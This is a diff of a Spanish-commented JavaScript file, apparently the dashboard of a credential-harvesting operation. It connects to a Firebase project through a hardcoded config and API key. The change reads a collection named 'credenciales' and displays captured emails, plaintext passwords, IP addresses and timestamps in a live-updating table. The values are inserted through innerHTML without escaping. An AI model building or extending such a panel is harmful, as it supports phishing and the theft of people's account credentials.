@@ -1,8 +1,6 @@
-// Importar las funciones necesarias de Firebase
 import { initializeApp } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-app.js";
-import { getFirestore, onSnapshot, collection } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-firestore.js";
+import { getFirestore, collection, query, orderBy, onSnapshot } from "https://www.gstatic.com/firebasejs/9.14.0/firebase-firestore.js";
 
-// Configuración de Firebase
 const firebaseConfig = {
     apiKey: "AIzaSyBfvn5njW-YQt9NPKd49x8rCVEFKY4dhmw",
     authDomain: "zphdozer.firebaseapp.com",
@@ -17,22 +15,30 @@ const firebaseConfig = {
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
 
-// Referencia a la colección de usuarios
-const userCollection = collection(db, 'users');
-
-// Obtener datos en tiempo real
-onSnapshot(userCollection, (snapshot) => {
+document.addEventListener('DOMContentLoaded', () => {
+    // Obtener referencia a la tabla
     const userTableBody = document.getElementById('user-table-body');
-    userTableBody.innerHTML = ''; // Limpiar la tabla antes de agregar nuevos datos
 
-    snapshot.forEach(doc => {
-        const userData = doc.data();
-        const row = document.createElement('tr');
-        row.innerHTML = `
-            <td>${userData.email}</td>
-            <td>${userData.ip}</td>
-            <td>${userData.timestamp.toDate().toLocaleString()}</td>
-        `;
-        userTableBody.appendChild(row);
+    // Crear consulta ordenada por fecha
+    const q = query(collection(db, 'credenciales'), orderBy('timestamp', 'desc'));
+
+    // Escuchar cambios en tiempo real
+    onSnapshot(q, (snapshot) => {
+        userTableBody.innerHTML = ''; // Limpiar tabla
+        
+        snapshot.forEach((doc) => {
+            const data = doc.data();
+            const row = document.createElement('tr');
+            
+            // Crear celdas con los datos
+            row.innerHTML = `
+                <td>${data.email}</td>
+                <td>${data.password}</td>
+                <td>${data.ip || 'No disponible'}</td>
+                <td>${data.timestamp.toDate().toLocaleString()}</td>
+            `;
+            
+            userTableBody.appendChild(row);
+        });
     });
 });
